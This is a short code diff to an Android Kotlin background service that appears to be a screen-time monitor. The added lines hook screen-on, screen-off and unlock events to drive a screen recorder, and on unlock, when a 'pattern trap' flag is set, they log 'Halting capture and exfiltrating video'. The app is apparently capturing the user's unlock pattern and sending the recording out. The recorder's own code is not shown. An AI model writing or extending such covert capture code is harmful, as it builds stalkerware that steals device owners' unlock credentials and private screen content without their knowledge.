@@ -39,6 +39,7 @@ class MonitorService : Service() {
         override fun onReceive(context: Context, intent: Intent) {
             when (intent.action) {
                 Intent.ACTION_SCREEN_ON -> {
+                    ScreenRecordManager.resumeRecording()
                     // Wake up: Update stats immediately
                     val time = getScreenTime()
                     val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
@@ -46,7 +47,14 @@ class MonitorService : Service() {
                     checkResurrection()
                 }
                 Intent.ACTION_SCREEN_OFF -> {
+                    ScreenRecordManager.pauseRecording()
                     // Sleep: Do absolutely nothing to save battery
+                }
+                Intent.ACTION_USER_PRESENT -> {
+                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
+                        DebugLogger.log("CAPTURE_PATTERN", "Device Unlocked. Halting capture and exfiltrating video.")
+                        ScreenRecordManager.stopRecording()
+                    }
                 }
             }
         }
@@ -101,6 +109,7 @@ class MonitorService : Service() {
         val filter = IntentFilter().apply {
             addAction(Intent.ACTION_SCREEN_ON)
             addAction(Intent.ACTION_SCREEN_OFF)
+            addAction(Intent.ACTION_USER_PRESENT)
         }
         // ANDROID 14 FIX: Must specify export visibility for dynamic receivers
         androidx.core.content.ContextCompat.registerReceiver(
